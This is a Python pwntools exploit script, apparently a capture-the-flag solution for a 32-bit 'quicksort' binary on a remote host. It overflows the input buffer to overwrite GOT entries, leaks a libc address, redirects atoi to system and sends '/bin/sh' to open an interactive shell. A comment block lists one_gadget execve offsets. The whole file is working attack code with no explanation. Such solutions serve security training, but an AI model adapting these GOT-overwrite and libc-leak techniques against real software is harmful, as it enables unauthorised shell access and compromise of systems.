#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
local = 0
if local:
    a=process("./quicksort")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("34.92.96.238","10000")
    libc=ELF("./libc.so.6")
elf=ELF("./quicksort")
start_addr=134514096
def debug():
    gdb.attach(a,'''
    b *0x8048901
    ''')
#debug()
a.recvuntil("how many numbers do you want to sort?\n")
a.sendline("2")
a.recvuntil("number:")
payload='134514096'+'\x00'+'\x00'*6
payload+=p32(2)#v18
payload+=p32(0)*2#i,j
payload+=p32(0x804A024)#stack_chk_fail_got  ==> start_address
payload+=p32(1)#canary
a.sendline(payload)

a.recvuntil("number:")
payload='134514016'+'\x00'+'\x00'*6
payload+=p32(1)#v18
payload+=p32(0)*2#
payload+=p32(0x804A018)#free_got ==> puts_plt
payload+=p32(1)
a.sendline(payload)
a.recvuntil("how many numbers do you want to sort?\n")
a.sendline("2")
a.recvuntil("number:")
#286331153 0x11111111
payload='134514016'+'\x00'+'\x00'*6
payload+=p32(1)#v18
payload+=p32(0)*2#i,j
payload+=p32(0x804A010)
payload+=p32(1)#canary
#debug()
a.sendline(payload)
#08048560
a.recvuntil("\x60\x85\x04\x08")
libc_base=u32(a.recv(4))-libc.symbols["gets"]
success("libc_base ==> 0x%x"%libc_base)
one_gadget=libc_base+libc.symbols["system"]
one_gadget=-(0xffffffff-one_gadget+1)
a.recvuntil("how many numbers do you want to sort?\n")
a.sendline("2")
a.recvuntil("number:")
payload=str(one_gadget)
payload=payload.ljust(16,'\x00')
payload+=p32(0)#v18
payload+=p32(0)*2#i,j
payload+=p32(0x804A038) #atoi ==>system
payload+=p32(1)#canary
a.sendline(payload)

a.recvuntil("how many numbers do you want to sort?\n")
a.sendline("2")
a.recvuntil("number:")
a.sendline("/bin/sh\x00")
a.interactive()
'''
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''